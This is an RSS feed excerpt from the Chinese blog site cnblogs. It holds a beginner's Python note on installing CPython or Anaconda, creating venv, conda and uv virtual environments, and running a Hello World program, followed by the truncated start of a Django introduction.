{
  "title": "主页 - 博客园",
  "link": "https://www.cnblogs.com/",
  "description": "主页 - 博客园 RSS",
  "entries": [
    {
      "title": "Python 学习笔记：编程环境配置",
      "link": "https://www.cnblogs.com/owlman/p/19501012",
      "published": "",
      "description": "<h2 class=\"post-title\">\n            <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/owlman/p/19501012\" id=\"cb_post_title_url\" title=\"发布于 2026-01-19 12:00\">\n    <span>Python 学习笔记：编程环境配置</span>\n    \n\n</a>\n\n        </h2>\n        <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<blockquote>\n<p>[!NOTE] 笔记说明</p>\n<p>根据之前在《[[关于Python的学习]]》一文中的规划，这篇笔记中将会具体记录配置 Python 编程环境所需执行的操作步骤，这些操作将着重于解决以下问题：</p>\n<ul>\n<li>如何根据具体需求来配置运行时环境；</li>\n<li>如何基于具体的项目来搭建编程环境；</li>\n</ul>\n</blockquote>\n<h2 id=\"安装-python-解释器\">安装 Python 解释器</h2>\n<p>正所谓“工欲善其事，必先利其器”。虽然 Python 被广泛认为是一门跨平台编程语言，但这种跨平台能力并非语言本身直接提供，而是依赖于各个平台上对应的 Python 运行时实现（runtime implementation）来完成的。换言之，Python 代码能够在不同操作系统平台上运行，前提是目标平台上安装有相应的 Python 解释器及其运行环境。就当前主流的应用场景来说，我们所使用的 Python 运行时实现大致可分为以下两种体系：</p>\n<ul>\n<li>\n<p><strong>官方实现体系</strong>：该体系由 Python 官方社区主导开发和维护，其核心是 CPython 解释器，同时包含标准库，以及围绕其构建的包管理与环境管理工具，例如 <code>pip</code>、<code>venv</code>，以及近年来逐渐流行的 <code>uv</code> 等。这一体系强调对语言规范（PEP）的忠实实现，是 Python 语言事实上的参考实现，也是绝大多数第三方扩展默认支持的运行环境。</p>\n</li>\n<li>\n<p><strong>Conda 实现体系</strong>：该体系由 Anaconda 公司主导维护，在提供 Python 解释器和标准库的同时，引入了以 <code>conda</code> 命令行工具为核心的包管理与环境管理机制。<code>conda</code> 命令不仅可以管理 Python 的第三方扩展（包或框架），还能够统一管理 C/C++、Fortran 等编译型依赖，因此在科学计算和数据分析领域具有较强的工程优势。此外，Conda 官方维护了一套经过严格测试的第三方扩展仓库，使其在可复现性和环境一致性方面表现尤为突出。</p>\n</li>\n</ul>\n<p>因此，在正式开始学习 Python 这门编程语言之前，我们首先需要根据自身的使用场景（学习、工程开发、科研计算等）选择合适的运行时实现体系，并正确配置 Python 解释器及其运行环境。这一步骤虽然看似琐碎，却直接决定了后续学习与开发过程的顺畅程度。下面，让我们先从 Python 解释器的安装开始介绍。</p>\n<h3 id=\"官方-python-解释器\">官方 Python 解释器</h3>\n<p>如果读者是 Python 这门编程语言本身的初学者，那么使用严格按照该语言官方规范（PEP）来实现的 CPython 解释器无疑是最稳妥的选择。下面，就让我们根据 Python 官方社区提供的指导文档，来了解如何在不同操作系统平台上安装这一解释器。</p>\n<ul>\n<li>\n<p>如果读者选择使用 <code>apt</code>、<code>pacman</code>、<code>Homebrew</code> 这一类软件包管理器来安装 Python 解释器及其运行环境，那么通常是不需要根据自己所在设备的 CPU 架构与操作系统平台来选择要安装的软件包的。但这种方式通常都是以 Shell 命令的方式来使用的，这就意味着读者必须要了解各种操作系统使用的包管理器，以及这项包管理器在安装该运行时环境时所需要执行的 shell 命令。下面是各种常见的包管理器安装官方 Python 解释器及其运行环境的命令。</p>\n<pre><code class=\"language-bash\"># 在 Ubuntu、Deepin 等以 Debian 项目为基础的 Linux 发行版中，\n# 我们使用的是 apt 包管理器，这里需要安装的是 Python 3.x，\n# 以及用于将 python3 命令设置为默认 python 命令的 python-is-python3：\nsudo apt install python3 python-is-python3\n\n# 在以 Arch Linux 项目为基础的 Linux 发行版中，\n# 我们使用的是 pacman 包管理器，它安装 Python 3.x 的命令如下：\nsudo pacman -S python3   \n\n# 在 macOS 操作系统中，我们可以使用 Homebrew 包管理器来安装 Python 3.x：\nbrew install python3\n\n# 在 Windows 7 以上的 Microsoft Windows 操作系统中，\n# 我们可使用 Scoop 这款包管理器来安装 Python 3.x：\nscoop install python\n</code></pre>\n</li>\n<li>\n<p>如果读者选择在 macOS 或 Windows 这样的图形化操作系统中以 GUI 的方式来安装官方 Python 解释器及其运行环境，那么就需先找到并下载与自己所在设备的 CPU 架构与操作系统相匹配的二进制安装包（在 Windows 中通常是一个扩展名为<code>.exe</code>的文件，在 macOS 中则是扩展名为<code>.img</code>的文件），然后启动它的图形化向导来完成相关的安装操作。例如在 Windows 系统中，Python 3.x 运行时环境的安装步骤主要如下。</p>\n<ol>\n<li>\n<p>访问 Python 官方网站的下载页面，并根据自身所在设备的 CPU 架构及其所运行的 Windows 版本来下载相应的二进制安装包，其官方下载页面如图 1 所示。</p>\n \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 1</strong>：Python 官方下载页面</p>\n</li>\n<li>\n<p>待上述二进制安装包被成功下载到本地计算机上之后，以系统管理员的身份打开该安装包，以便启动其图形化安装向导，如图 2 所示。</p>\n \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 2</strong>：Python 图形化安装向导</p>\n<p>上述界面中，我们需要先勾选“Add Python.exe to PATH”选项，然后再单击“Customize installation”选项。这个选项用于将 Python 加入到系统的 PATH 环境变量中，这样会让我们日后直接在系统的终端环境中使用 Python 运行时环境，否则我们在后面的操作中可能就需要在该环境变量中手动添加路径。</p>\n</li>\n<li>\n<p>在图形化向导的第二个页面中，我们需要选择要安装的 Python 组件，其中的选项“Documentation”表示安装 Python 的帮助文档；选项“pip”表示安装 Python 的第三方包管理工具；选项“tcl/tk and IDLE”表示安装 Python 的集成开发环境；选项“Python test suite”表示安装 Python 的标准测试套件，后两个选项则表示允许版本更新。在这里，我们会建议读者勾选该页面上列出的所有选项，然后单击“Next”按钮继续下一步的安装设置，如图 3 所示。</p>\n \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 3</strong>：选择要安装的组件</p>\n</li>\n<li>\n<p>在图形化向导的第三个页面中，我们需要设置 Python 的安装路径。通常情况下，读者只需要保持该页面上所有的默认选项即可，当然，也可以选择单击“Browse”按钮，设置好自己想要安装路径，如图 4 所示。</p>\n \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 4</strong>：设置安装路径</p>\n</li>\n<li>\n<p>在设置好安装路径之后，我们就可以单击“Install”按钮正式开始执行 Python 运行时环境的安装操作，读者只需等待安装向导中的进度条显示完成即可，如图 5 所示。</p>\n \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 5</strong>：安装进度条</p>\n</li>\n<li>\n<p>待上述安装过程完成之后，我们就会看到如图 6 所示界面，安装过程已经顺利完成，读者可以通过单击“Close”按钮来退出这个图形化安装向导。</p>\n  \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 6</strong>：安装结束界面</p>\n</li>\n</ol>\n</li>\n<li>\n<p>最后，如果我们想验证 Python 运行时环境是否已经安装成功，就只需要在自己所在的操作系统中打开 Shell 终端环境，例如 Windows 系统下的 Powershell 或 Unix-like 系统下的 Bash、Zsh 等命令行终端程序，并在其中执行<code>python</code>命令（如果计算机上同时安装了多个版本的 Python 解释器，可能需要在命令中指定版本号），如果看到如图 7 所示的脚本交互界面，其中会显示当前 Python 解释器及其运行环境的相关信息，这证明它已经成功安装到了我们的计算机上。</p>\n  \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 7</strong>：Python 的脚本交互界面</p>\n</li>\n</ul>\n<h3 id=\"anaconda-python-解释器\">Anaconda Python 解释器</h3>\n<p>如果读者使用 Python 的场景主要集中在科学计算、数据科学等领域，且不想花费大量的时间在配置运行环境之类的问题上，那么安装基于 Conda 体系的 Python 运行时实现无疑是一个更为合适的选择。下面，就让我们根据 Anaconda 官方网站提供的指导文档，来了解如何在不同操作系统平台上安装基于这一体系的 Python 运行时实现。</p>\n<ul>\n<li>\n<p>如果读者选择在 macOS 或 Windows 这样的图形化操作系统中以 GUI 的方式来安装 Anaconda Python 解释器及其运行环境，那么就需先找到并下载与自己所在设备的 CPU 架构与操作系统相匹配的二进制安装包（在 Windows 中通常是一个扩展名为<code>.exe</code>的文件，在 macOS 中则是扩展名为<code>.pkg</code>的文件），然后启动它的图形化向导来完成相关的安装操作。例如在 Windows 10/11 系统中，其安装步骤主要如下。</p>\n<ol>\n<li>\n<p>在使用网页浏览器中打开 Anaconda 官方网站的下载页面（如图 8 所示）之后，读者会在该页面中看到“Anaconda Distribution”与“Miniconda Distribution”两个选项，它们之间的区别在于前者除了 Python 解释器及其运行环境之外，还包含了 Anaconda 官方维护的绝大多数第三方扩展，而后者则只包含 Python 解释器及其运行环境。考虑到我们选择 Conda 体系的目的是节省配置运行时环境的时间，在这里应该下载的是“Anaconda Distribution”。</p>\n \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 8</strong>：Anaconda 的官方下载页面</p>\n</li>\n<li>\n<p>待上述二进制安装包被成功下载到本地计算机上之后，用该安装包启动其图形化安装向导，其界面如图 9 所示。</p>\n \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 9</strong>：Anaconda 的图形化安装向导</p>\n</li>\n<li>\n<p>根据图形化向导一路单击“Next”或“I Agree”按钮，直到出现如图 10 所示界面，这里需要读者选择 Anaconda 的安装路径，通常情况下，读者只需要保持该页面上所有的默认选项即可，当然，也可以选择单击“Browse”按钮，设置好自己想要安装路径。</p>\n \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 10</strong>：设置安装路径</p>\n</li>\n<li>\n<p>在设置好安装路径之后，继续单击“Next”按钮，就会看到如图 11 所示界面，上面有四个可勾选的配置项，分别是“Create Shartouls（创建快捷方式）”、“Add Anaconda3 to my PATH environment variable（将 Anaconda3 添加到系统的 PATH 环境变量中）”、\"Register Anaconda3 as the system Python 3.x（将 Anaconda3 注册为默认的 Python 3.x 版本）”，以及\"Clear the packages cache upon completion（安装完成后清除缓存）\"，读者可根据需要勾选这些选项，然后单击“Install”按钮正式开始执行 Anaconda Python 运行时环境的安装操作，读者只需等待安装向导中的进度条显示完成即可。</p>\n \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 11</strong>：安装进度条</p>\n</li>\n<li>\n<p>待上述安装过程完成之后，我们就会看安装结束界面，接下来只需单击“Next”按钮就可退出这个图形化安装向导，如图 12 所示。</p>\n \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 12</strong>：安装结束界面</p>\n</li>\n</ol>\n</li>\n<li>\n<p>如果读者选择在 Linux 这样的 Unix-like 操作系统中安装 Anaconda Python 解释器及其运行环境，那么就需先找到并下载与自己所在设备的 CPU 架构与操作系统相匹配的安装脚本文件（通常是一个扩展名为<code>.sh</code>的文件），然后启动它的图形化向导来完成相关的安装操作。例如在 CentOS 7 操作系统中，其安装步骤主要如下。</p>\n<ol>\n<li>\n<p>在 Bash、Zsh 这样的 Shell 应用中执行刚刚下载到的安装脚本，执行命令如下：</p>\n<pre><code class=\"language-bash\"># 此处的 &lt;version&gt; 用于指代 Anaconda 的版本号\nbash Anaconda3-&lt;version&gt;-Linux-x86_64.sh\n</code></pre>\n</li>\n<li>\n<p>在执行上述命令之后，就会看到一个字符界面的安装向导，读者可按以下提示执行安装操作：</p>\n<ul>\n<li><strong><strong>阅读许可协议</strong></strong>：可按空格键翻页，并通过输入 yes 接受协议。</li>\n<li><strong>选择安装路径</strong>：默认路径为 <code>~/anaconda3</code>，推荐直接按回车键确认，保留默认设置（避免权限问题）。如需自定义路径，应输入绝对路径（如 <code>/opt/anaconda3</code>，但需管理员权限）。</li>\n<li><strong>是否初始化 conda</strong>：安装向导会询问 Do you wish the installer to initialize Anaconda3 by running conda init?，建议输入 yes。此步骤会自动将 conda 添加到 Shell 配置文件（如 <code>.bashrc</code> 或 <code>.zshrc</code>），避免手动配置环境变量。</li>\n</ul>\n</li>\n<li>\n<p>待安装完成后，关闭当前终端并重新打开，或执行以下命令可使上述配置生效：</p>\n<pre><code class=\"language-bash\">source ~/.bashrc  # 若使用 zsh，替换为 source ~/.zshrc\n</code></pre>\n</li>\n</ol>\n</li>\n<li>\n<p>最后，如果我们想验证 Python 运行时环境是否已经安装成功，就只需要在自己所在的操作系统中打开 Shell 终端环境，例如 Windows 系统下的 Powershell 或 Unix-like 系统下的 Bash、Zsh 等命令行终端程序，并在其中执行<code>conda --version</code>查看版本信息，或执行<code>python</code>命令打开脚本交互界面，查看其中显示的 Python 运行环境信息，如果信息如图 13 所示，这证明它已经成功安装到了我们的计算机上。</p>\n  \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 13</strong>： Anaconda 的脚本交互界面</p>\n</li>\n</ul>\n<p>在成功安装了 Python 解释器之后，我们接下来就可以根据自己要运行的项目/应用来配置 Python 的运行时环境了。然而，由于近些年 Python 在数据科学、人工智能等领域的爆炸式发展，如今市场上同时存在着多个版本的 Python 解释器，每个版本的解释器还存在着多种不同的实现，这让运行时环境的配置工作变得比十年前要复杂得多。</p>\n<h2 id=\"从虚拟环境开始创建项目\">从虚拟环境开始创建项目</h2>\n<p>为了应对近年来由人工智能应用迅猛发展所带来的各种变化，Python 社区在运行时环境的配置方面逐渐确立起了一个极其重要的项目配置原则：“<strong>任何非一次性的小脚本开发，都应当从创建虚拟环境开始</strong>\"。该原则是工程师们从长期工作实践中总结出来的经验，因为他们发现绝大多数新手在使用 Python 过程中所遇到的大部分头痛问题，都并非因为语言本身，而是来自对其运行时环境及其依赖管理机制的误解。具体来说就是：在现有条件下，如果我们直接在当前系统或用户权限下使用 Python 解释器来开发具体的项目，大概率就会遇到依赖管理方面的问题。</p>\n<p>这是因为 Python 的第三方扩展默认是“全局可见”的，当我们在执行诸如<code>pip install numpy</code>这样的命令时，它所安装的扩展包会被放入当前 Python 解释器所对应的<code>site-packages</code>目录中。这意味着：</p>\n<ul>\n<li>当前 Python 解释器所运行的所有 Python 项目都会“看到”这个包；</li>\n<li>如果升级、降级或删除某个包，就会影响到当前 Python 解释器运行的<strong>所有项目</strong>。</li>\n</ul>\n<p>在语言的初学阶段，这样做也许一时半会并不会带来明显的问题；但一旦进入到工程化的环境中，我们就会陆续遇到以下情形，风险也就随之暴露了出来：</p>\n<ul>\n<li>昨天还能跑的项目，今天什么都没改却报错了。</li>\n<li>因新项目升级了相关的依赖，导致旧项目无法运行；</li>\n<li>不同的项目依赖同一扩展包的<strong>不同版本</strong>，导致冲突；</li>\n<li>教程代码在你本地无法复现，但在作者环境中可以正常运行；</li>\n</ul>\n<p>这些问题都是因为项目中的<em>依赖关系缺乏隔离</em>。那么为什么虚拟环境可以解决这个问题呢？事实上，虚拟环境（Virtual Environment）并不是某种“高级技巧”，它本质上就是在 <strong>为每一个 Python 项目提供一套彼此独立、互不干扰的运行时环境</strong> 。即在一个虚拟环境中：</p>\n<ul>\n<li>Python 解释器是“看似独立”的；</li>\n<li>第三方扩展只对当前环境可见；</li>\n<li>依赖版本可以被精确锁定；</li>\n<li>项目可以被完整复现。</li>\n</ul>\n<p>换言之，虚拟环境解决的并不是“如何安装更多库”的问题，而是如何让一个项目在时间、空间和他人机器上保持可控性。从工程角度看，这一点甚至比语法熟练程度更加重要。</p>\n<p>在当前的 Python 生态中，虚拟环境的实现方式并不唯一，但它们的目标高度一致。下面，让我们来具体介绍几种基于虚拟环境来创建 Python 开发项目的常见解决方案。</p>\n<h3 id=\"python-官方解决方案\">Python 官方解决方案</h3>\n<p>Python 官方在 3.3 及其之后的版本中引入了内置的虚拟环境管理工具，它允许我们先通过<code>venv</code>模块来创建虚拟环境，然后在该虚拟环境中使用 pip 管理项目依赖。该工具链在 Windows、macOS 以及各种 Linux 发行版上均可使用，用该工具创建项目的步骤如下。</p>\n<ol>\n<li>\n<p>在 Bash、Zsh 这类的命令行终端中进入到目标项目所在的目录中（例如<code>examples/say_hello</code>目录），然后执行<code>python -m venv &lt;虚拟环境目录&gt;</code>命令创建一个新的虚拟环境，并使用<code>source &lt;虚拟环境目录&gt;/bin/activate</code>命令激活该虚拟环境，具体如图 14 所示。</p>\n \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 14</strong>：Python 官方虚拟环境创建与激活</p>\n<p><strong>请注意</strong>：<code>&lt;虚拟环境目录&gt;</code>除了是虚拟环境存放运行时环境文件的目录之外，它的最底层目录名也是该虚拟环境的唯一标识符，读者可根据自己的需要自行设置。另外，如果读者使用的命令行终端是 Windows 系统下的 PowerShell 或 CMD，那么激活虚拟环境的命令就应改为<code>.\\&lt;虚拟环境目录&gt;\\Scripts\\Activate.ps1</code>或<code>.\\\\&lt;虚拟环境目录&gt;\\Scripts\\activate.bat</code>。</p>\n</li>\n<li>\n<p>在成功创建并激活了虚拟环境之后，Shell 会优先使用虚拟环境中的 pip 可执行文件，因此此时执行的 pip 命令将仅作用于当前虚拟环境，而不会影响系统中的其他 Python 项目。接下来，我们就可以在虚拟环境中独立安装 Python 的第三方扩展了。例如，如果读者现在到<code>examples/say_hello</code>目录下执行<code>pip install numpy</code>命令，就可以在该项目的<code>&lt;虚拟环境目录&gt;</code>下的<code>lib/&lt;python-version&gt;/site-packages</code>子目录中看到新安装的 numpy 包了，如图 15 所示。</p>\n \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 15</strong>：Python 官方虚拟环境中的第三方扩展</p>\n<p><strong>请注意</strong>：<code>&lt;python-version&gt;</code>是 Python 解释器的版本号，例如<code>python3.11</code>、<code>python3.14</code>等。</p>\n</li>\n</ol>\n<p>关于具体如何使用 pip 来管理 Python 项目中的第三方扩展，我将会将在《[[具体项目实践]]》这篇笔记中做详细讲解，在这里就先暂且按下不表了。</p>\n<h3 id=\"anaconda-解决方案\">Anaconda 解决方案</h3>\n<p>在基于 Conda 体系的 Python 运行时实现中，基于虚拟环境来创建项目，并管理项目依赖的解决方案则要简单得多，基本上只靠 <code>conda</code> 命令就可以完成。而该工具同样在 Windows、macOS 以及各种 Linux 发行版上均可使用，用该工具创建项目的步骤如下。</p>\n<ol>\n<li>\n<p>在命令行终端中进入到目标项目所在的目录中（例如<code>examples/say_hello</code>目录），然后执行<code>conda create -n &lt;虚拟环境名称&gt; python=&lt;python-version&gt;</code>命令创建一个新的虚拟环境，具体如图 16 所示。</p>\n \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 16</strong>：Anaconda 虚拟环境创建与激活</p>\n<p><strong>请注意</strong>：<code>&lt;虚拟环境名称&gt;</code>是虚拟环境的唯一标识符，另外，<code>python=&lt;python-version&gt;</code>是可选参数，其中的<code>&lt;python-version&gt;</code>用于指定当前项目要使用的 Python 版本号，例如<code>python=3.11</code>、<code>python=3.14</code>等。</p>\n</li>\n<li>\n<p>在成功创建虚拟环境之后，我们接下来就可以使用<code>conda env list</code>命令来查看当前计算机中所有基于 Conda 体系的虚拟环境及其所在的目录，如图 17 所示。</p>\n \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 17</strong>：Anaconda 虚拟环境列表</p>\n<p><strong>请注意</strong>：与 Python 官方解决方案不同的是，基于 Conda 体系的虚拟环境并不被保存在当前项目所在的目录中，而是被保存在 Anaconda 安装目录下的<code>envs</code>子目录中。当然，这也意味着同一个 Conda 虚拟环境通常会被多个项目复用，因此在具体的项目实践中需要格外注意环境命名与用途划分。</p>\n</li>\n<li>\n<p>我们接下来要做的就是使用<code>conda activate &lt;虚拟环境名称&gt;</code>命令来激活刚刚创建的虚拟环境，然后就可以使用<code>conda install &lt;扩展包名称&gt;</code>命令来安装 Python 的第三方扩展了。例如，通过执行<code>conda install numpy</code>命令来安装 numpy 扩展，如图 18 所示。</p>\n \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 18</strong>：在 Anaconda 虚拟环境中安装第三方扩展</p>\n</li>\n<li>\n<p>如果上述命令执行顺利，我们就可以通过执行<code>conda list &lt;扩展包名称&gt;</code>命令来确认刚刚安装的扩展包是否已经成功安装到了虚拟环境中，如图 19 所示。</p>\n \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 19</strong>：在 Anaconda 虚拟环境中查看第三方扩展</p>\n</li>\n</ol>\n<p>同样的，关于具体如何使用 Conda 来管理 Python 项目的第三方扩展及其依赖关系，我将会在《[[具体项目实践]]》这篇笔记中做详细讲解，在这里就先暂且按下不表了。</p>\n<h3 id=\"第三方解决方案\">第三方解决方案</h3>\n<p>考虑到基于 Conda 体系的解决方案毕竟来自第三方实现，会导致 Python 的解释器在版本上会有些落后于官方，而 Python 官方提供的 pip 又缺乏管理复杂依赖关系的能力（例如它在移除项目的某一直接依赖时，无法自动移除其间接依赖）。近些年来，Python 社区为了解决此类问题又陆续发展出了基于 <code>uv</code> 、<code>poetry</code>等第三方工具来创建 Python 项目并管理项目依赖的解决方案。由于这些解决方案既可作用于官方的 Python 解释器，也可作用于 Conda 体系中的 Python 解释器，因此它们在项目实践中也变得越来越流行。下面，我就以 <code>uv</code> 这款工具为例，来介绍一下如何使用这类工具创建 Python 项目。</p>\n<ol>\n<li>\n<p>如果读者现在还没有安装 <code>uv</code>，可先通过在命令行终端中执行<code>pip install uv</code>命令来安装这款工具，然后再使用<code>uv --version</code>命令来查看其版本信息，如果信息如图 20 所示，这证明它已经成功安装到了我们的计算机上。</p>\n \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 20</strong>：uv 的安装与确认</p>\n</li>\n<li>\n<p>在成功安装了 <code>uv</code> 工具之后，我们就可以使用该工具来创建 Python 项目了。例如，如果读者现在到<code>examples/say_hello</code>目录下执行<code>uv init</code>命令，就会看到该目录被初始化成了一个标准的 Python 项目，我们可以使用<code>ls</code>命令来查看一下这个项目的目录结构，如图 21 所示。</p>\n \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 21</strong>：使用 uv 初始化的 Python 项目</p>\n<p>正如读者所见，<code>uv</code> 这款工具会为该项目创建以下一系列文件：</p>\n<ul>\n<li><code>pyproject.toml</code>：该文件用于保存 Python 项目的基本配置；</li>\n<li><code>README.md</code>：该文件用于保存 Python 项目的说明性信息；</li>\n<li><code>main.py</code>：该文件用于保存 Python 项目的入口代码。</li>\n<li><code>.python-version</code>：该文件用于保存 Python 项目的 Python 解释器版本号。</li>\n</ul>\n</li>\n<li>\n<p>在成功完成 Python 项目的初始化工作之后，我们接下来就可以使用<code>uv add &lt;扩展包名称&gt;</code>命令来安装 Python 的第三方扩展了。例如，通过执行<code>uv add numpy</code>命令来安装 numpy 扩展，如图 22 所示。</p>\n \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 22</strong>：使用 uv 安装项目的第三方扩展</p>\n<p>正如读者所见，<code>uv</code> 这款工具会在第一次为项目安装扩展时自动为其创建虚拟环境，并将其依赖关系写入到<code>pyproject.toml</code>文件中，以便日后自动处理项目中的依赖关系。</p>\n</li>\n<li>\n<p>如果上述命令执行顺利，我们就可以通过执行<code>uv pip list</code>命令来确认刚刚安装的扩展包是否已经成功安装到了虚拟环境中，如图 23 所示。</p>\n \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 23</strong>：使用 uv 查看项目的第三方扩展</p>\n</li>\n</ol>\n<p>当然了，<code>uv</code> 除了可以管理项目中的第三方扩展及其依赖关系之外，甚至还可以为项目指定要使用的 Python 解释器版本号，关于这些高级功能的详细使用方法，我将会在《[[具体项目实践]]》这篇笔记中做详细讲解，读者在这里暂时只需要知道 <code>uv</code> 这款工具的基本使用方法即可。</p>\n<h2 id=\"选择合适的编程工具链\">选择合适的编程工具链</h2>\n<p>从理论的角度上来说，要想编写一个基于 Python 语言及其运行时环境的应用程序，通常只需要使用任意一款纯文本编辑器就可以了。但在具体的项目实践中，为了在工作过程中获得代码的语法高亮与智能补全等功能以提高编码体验，并能方便地使用各种强大的程序调试工具和版本控制工具，我们通常还是会选择使用一款专用的代码编辑器或集成开发环境来完成项目开发。在这里，我个人会倾向于推荐读者使用 Visual Studio Code 编辑器（以下简称 VS Code）来构建所有的项目。读者可以参考下面这篇笔记来学习这款编辑器的安装方法，以及如何将其打造成一款用于编写 Python 应用程序的集成开发环境。</p>\n<blockquote>\n<p>关联笔记：[[VS Code 配置笔记]]：<a href=\"https://www.cnblogs.com/owlman/p/17537015.html\" target=\"_blank\">博客园链接</a></p>\n</blockquote>\n<p>除此之外，Atom 与 Sublime Text 这两款编辑器也与 VS Code 编辑器有着类似的插件生态系统和使用方式，如果读者喜欢的话，也可以使用它们来打造属于自己的项目开发工具，方法是大同小异的。而除了上述专用的代码编辑器之外，如果读者更习惯使用传统的集成开发环境（IDE），JetBrains 公司旗下的 PyCharm 无疑会是一个不错的选择，它在 Windows、macOS 以及各种 Linux 发行版上均可做到所有的功能都是开箱即用，无需进行多余的配置，这对初学者是相对比较友好的。当然了，令人比较遗憾的是，PyCharm 的专业版本并非是一款免费的软件，而免费的社区版在功能上则多多少少会受到一些限制。如果考虑到程序员们在实际生产环境中各种可能的需要及其带来的相关开销等因素，我个人还是会倾向于建议大家尽可能地选择开源软件，这个系列的笔记接下来也将会以 VS Code 编辑器为主要编程工具来展开后续的各种实例演示。</p>\n<h2 id=\"学习成果验收hello-world\">学习成果验收：Hello World</h2>\n<p>现在，为了验证我们已经成功配置好了使用 Python 语言的编程工具，接下来就需要尝试着使用这些工具来编写一个 Python 版本的 Hello World 程序，看看它能否在我们所在的计算机设备上成功运行起来。编写该程序的具体步骤如下。</p>\n<ol>\n<li>\n<p>使用 VS Code 编辑器打开之前创建的<code>examples/say_hello</code>目录，并在其集成终端中使用<code>uv init</code>命令将其初始化为一个 Python 项目。</p>\n</li>\n<li>\n<p>在编辑器中打开项目的入口文件<code>main.py</code>，然后将其中的代码修改如下：</p>\n<pre><code class=\"language-python\">#! /usr/bin/env python\n'''\n    Simple example to say hello\n    \n    Author: lingjie\n    Created on: 2024-06-15\n    '''\n\nauthor_name = \"owlman\"    \ndef say_hello(name: str) -&gt; None:\n    '''\n        Say hello by name.\n    \n        Args:\n            name: name to greet\n    '''\n    print(\"Hello World! My name is\", name)\n\nif __name__ == \"__main__\":\n    say_hello(author_name)\n</code></pre>\n<p>在这里，读者暂时不必理会这段代码中使用的具体语法，只需要知道它会在程序运行时输出一条包含用户 ID（即<code>author_name</code>变量的值）的问候语即可。稍后，我们将会在《[[基础语法学习]]》这篇笔记中详细讲解 Python 语言的语法规则。</p>\n</li>\n<li>\n<p>在保存上述文件之后，回到编辑器的集成终端环境中并执行<code>python main.py</code>命令，如果终端中输出了如图 24 所示的信息，就说明我们已经成功配置好了使用 Python 语言的编程工具。</p>\n \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 24</strong>：学习成果验收</p>\n</li>\n</ol>\n<h2 id=\"小结\">小结</h2>\n<p>在本篇笔记中，我首先介绍了如何安装 Python 解释器，并使用它来创建 Python 项目，然后又介绍了如何使用 Conda 来管理 Python 项目的第三方扩展及其依赖关系，最后又介绍了如何选择合适的编程工具链。在完成上述配置之后，我们就可以使用这些工具来编写 Python 程序了。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n        <p class=\"postfoot\">\n            posted on \n<span id=\"post-date\">2026-01-19 12:00</span>&nbsp;\n<a href=\"https://www.cnblogs.com/owlman\">凌杰</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n\n        </p>"
    },
    {
      "title": "Django入门指南：Python Web开发的“瑞士军刀”",
      "link": "https://www.cnblogs.com/ymtianyu/p/19500859",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/ymtianyu/p/19500859\" id=\"cb_post_title_url\" title=\"发布于 2026-01-19 11:36\">\n    <span>Django入门指南：Python Web开发的“瑞士军刀”</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        本文为Python Web开发新手清晰梳理了Django框架的定位。通过将Django与FastAPI、Flask进行形象对比，阐明其“开箱即用”的全能特性、相对不足以及适用场景。文章包含从安装到创建第一个项目的完整实操步骤与代码，助你快速上手，并为框架选择提供决策参考。\n    </div>\n<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p><strong style=\"color: rgba(186, 55, 42, 1);\">想用Python快速搭建一个功能齐全的网站，却被各种框架搞得眼花缭乱？</strong></p>\n<p>我记得刚开始时，面对Flask的轻量、听说Django的“重”、还有后来FastAPI的炫酷，纠结了好久。直到着手编写一个正式项目——一个需要后台管理、用户认证和内容发布的小型社区网站—— deadline压下来，咬牙选了Django。结果？原本预估两周的基础搭建，<strong style=\"color: rgba(186, 55, 42, 1);\">用Django的“开箱即用”特性，三天就搓出了一个五脏俱全的雏形</strong>。今天，就来看看这把Web开发的“瑞士军刀”Django。</p>\n<h2>🎯 本文能帮你解决什么？</h2>\n<div>\n<p> 👉 1. 理清Django在Python Web框架中的地位与核心思想。</p>\n<p> 👉 2. 看懂Django相比FastAPI、Flask的独特优势和可能短板。</p>\n<p> 👉 3. 获得从零开始安装、配置并运行第一个Django项目的清晰步骤。</p>\n<p> 👉 4. 对“何时该用Django”有一个基于实战的判断。</p>\n</div>\n<h2>🧩 第一部分：Django是什么？为什么是它？</h2>\n<p>如果把建网站比作开店：</p>\n<div>\n<p> - <code style=\"color: rgba(186, 55, 42, 1);\">Flask</code> 